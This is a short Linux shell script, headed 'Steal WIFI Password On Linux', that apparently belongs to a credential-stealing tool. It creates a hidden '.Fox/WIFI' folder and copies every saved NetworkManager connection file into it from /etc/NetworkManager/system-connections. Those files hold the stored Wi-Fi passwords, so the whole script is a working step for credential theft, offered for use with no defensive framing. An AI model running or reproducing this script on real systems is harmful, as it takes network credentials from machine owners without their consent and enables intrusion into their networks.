### Steal WIFI Password On Linux ###
mkdir .Fox
mkdir .Fox/WIFI
for files in /etc/NetworkManager/system-connections/*
do
    cp "$files" .Fox/WIFI
done
